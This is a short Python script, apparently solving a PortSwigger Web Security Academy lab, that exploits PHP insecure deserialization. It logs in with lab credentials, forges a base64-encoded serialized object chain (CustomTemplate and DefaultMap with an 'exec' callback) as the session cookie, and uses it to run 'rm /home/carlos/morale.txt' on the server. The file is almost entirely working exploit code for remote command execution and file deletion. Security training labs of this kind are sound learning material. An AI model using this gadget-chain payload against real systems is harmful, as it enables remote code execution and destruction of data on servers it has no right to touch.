#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
import base64
from urllib.parse import quote

url = 'https://0a4400490495946f85c3ad2e001000d0.web-security-academy.net'

session = requests.Session()

# Đăng nhập 
data_login = {
    'username': 'wiener',
    'password': 'peter',
}


response = requests.post(
    url + "/login",
    data = data_login,
)

# lấy data từ cookie và xử lí
data_cookies = 'O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}'
encode_base64 = base64.b64encode(data_cookies.encode('utf-8')).decode('utf-8')
encode_url = quote(encode_base64)
solve = encode_url

cookies = {
    'session': solve,
}

# dùng cookie đã sử lý để xóa carlos
response = requests.get(
    url + '/product?productId=1',
    cookies=cookies,   
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)